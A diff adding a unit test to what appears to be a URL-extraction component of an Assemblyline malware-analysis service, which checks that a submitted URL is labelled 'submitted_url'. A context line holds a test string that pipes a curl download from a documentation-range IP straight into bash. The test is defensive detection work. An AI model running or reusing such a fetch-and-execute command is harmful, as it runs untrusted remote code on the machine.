@@ -34,6 +34,20 @@ def test_extracts_plain_curl_url():
     assert found[0].context == "curl"
 
 
+def test_uri_submission_content_labeled_distinctly():
+    # AL4 represents a directly-submitted URL (accepts: uri/.*, not code/.*|text/plain)
+    # as a small synthetic text file in this exact shape. A live submission of this
+    # kind ("6KaatdO1iTjzYt9O6WJTga") went entirely unprocessed because the old
+    # accepts regex didn't match uri/* at all -- PayloadFetcher never even ran. Once
+    # it does run, the extracted URL should read as "submitted_url", not the generic
+    # "unknown" fallback (there's no wget/curl token on this line).
+    text = "# Assemblyline URI file\nuri: http://203.0.113.10/checker.exe\n"
+    found = extract_urls(text)
+    assert len(found) == 1
+    assert found[0].url == "http://203.0.113.10/checker.exe"
+    assert found[0].context == "submitted_url"
+
+
 def test_extracts_multiple_urls_same_host():
     text = "\n".join([
         "curl -ks http://198.51.100.20/x | bash",
